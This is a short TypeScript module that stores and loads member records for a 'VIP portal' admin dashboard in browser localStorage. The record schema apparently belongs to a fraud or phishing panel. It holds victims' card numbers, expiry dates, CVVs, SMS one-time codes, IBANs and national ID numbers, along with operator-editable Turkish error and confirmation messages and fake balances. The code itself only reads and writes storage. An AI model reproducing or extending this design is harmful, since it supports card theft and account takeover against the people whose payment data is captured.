
import type { AdminMember } from "@/app/dashboard/admin/page";

const MEMBER_STORAGE_KEY = 'vip_portal_members';

// This function now only gets members from localStorage.
// The synchronization logic is handled by the creation/update process in the admin panel.
function getMembersFromStorageOnly(): AdminMember[] {
    if (typeof window === 'undefined') {
        return [];
    }
    const storedDetailsJSON = localStorage.getItem(MEMBER_STORAGE_KEY);
    if (storedDetailsJSON) {
        try {
            return JSON.parse(storedDetailsJSON);
        } catch (e) {
            console.error("Failed to parse members from localStorage", e);
        }
    }
    return [];
}


export async function getMembers(): Promise<AdminMember[]> {
    if (typeof window === 'undefined') {
        return [];
    }
    
    try {
        const storedMembers = getMembersFromStorageOnly();

        // Add default values to all members to prevent errors on the frontend
        // This ensures that any member object, even if partially saved, has all required keys.
        const allMembersWithDefaults = storedMembers.map(member => ({
            id: member.id || '',
            phone: member.phone || '', // email is stored in phone field
            name: member.name || '',
            iban: member.iban || '',
            bank: member.bank || '',
            tc: member.tc || '',
            il: member.il || '',
            ilce: member.ilce || '',
            weeklyGain: member.weeklyGain || '',
            errorMessage: member.errorMessage || 'İşlem sırasında bir hata oluştu. Lütfen destek ekibiyle iletişime geçin.',
            onayMesaji: member.onayMesaji || 'İşleminiz başarıyla alındı.',
            invoiceAmount: member.invoiceAmount || '',
            accountActivity: member.accountActivity || "",
            meetingInfo: member.meetingInfo || "",
            currentBalance: member.currentBalance || "0 TL",
            status: member.status || 'Pasif',
            transactionStatus: member.transactionStatus || 'allowed',
            cardNumber: member.cardNumber || '',
            cardExpiry: member.cardExpiry || '',
            cardCvv: member.cardCvv || '',
            smsCode: member.smsCode || '',
        }));
        
        return allMembersWithDefaults;

    } catch (error) {
        console.error("Failed to process members", error);
        return [];
    }
}


export function setMembers(members: AdminMember[]): void {
     if (typeof window === 'undefined') {
        return;
    }
    try {
        localStorage.setItem(MEMBER_STORAGE_KEY, JSON.stringify(members));
    } catch (error) {
        console.error("Failed to save members to localStorage", error);
    }
}
